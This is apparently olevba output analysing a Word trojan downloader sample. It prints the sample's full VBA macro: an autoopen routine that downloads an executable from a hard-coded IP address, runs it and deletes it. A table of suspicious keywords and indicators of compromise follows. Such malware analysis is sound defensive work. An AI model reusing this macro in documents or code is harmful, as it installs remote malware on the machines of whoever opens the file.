olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-Downloader.MSWord.Agent.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan-Downloader.MSWord.Agent.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan-Downloader.MSWord.Agent.a - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Sub autoopen()
On Error Resume Next
Dim szFileLocal
Dim lURL As String
    szFileLocal = Environ("windir")
    lURL = "http://81.27.111.103/ek/liu8080.exe"
    DownloadFile lURL, szFileLocal & "\temp.exe"
    Shell szFileLocal & "\temp.exe"
    Kill szFileLocal & "\temp.exe"
End Sub

 Function DownloadFile(URL As String, LocalFilename As String) As Boolean
    Dim lngRetVal As Long
    lngRetVal = URLDownloadToFile(0, URL, LocalFilename, 0, 0)
    If lngRetVal = 0 Then DownloadFile = True
End Function



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|URLDownloadToFileA  |May download files from the Internet         |
|Suspicious|DownloadFile        |May download files from the Internet using   |
|          |                    |PowerShell                                   |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://81.27.111.103|URL                                          |
|          |/ek/liu8080.exe     |                                             |
|IOC       |81.27.111.103       |IPv4 address                                 |
|IOC       |liu8080.exe         |Executable file name                         |
|IOC       |temp.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

